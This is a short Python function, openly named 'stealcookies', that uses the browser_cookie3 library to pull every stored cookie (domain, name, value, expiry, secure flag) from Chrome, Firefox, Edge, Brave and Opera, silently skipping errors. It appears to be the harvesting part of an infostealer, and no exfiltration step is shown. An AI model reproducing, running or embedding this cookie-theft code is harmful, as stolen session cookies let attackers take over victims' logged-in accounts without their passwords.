def stealcookies():
    cookies = []
    
    browser_functions = [
        ('Chrome', browser_cookie3.chrome),
        ('Firefox', browser_cookie3.firefox),
        ('Edge', browser_cookie3.edge),
        ('Brave', browser_cookie3.brave),
        ('Opera', browser_cookie3.opera)
    ]
    
    for browser_name, cookie_func in browser_functions:
        try:
            browser_cookies = cookie_func(domain_name='')
            for cookie in browser_cookies:
                cookies.append({
                    'browser': browser_name,
                    'domain': cookie.domain,
                    'name': cookie.name,
                    'value': cookie.value,
                    'expires': cookie.expires,
                    'secure': cookie.secure
                })
        except:
            continue
    
    return cookies
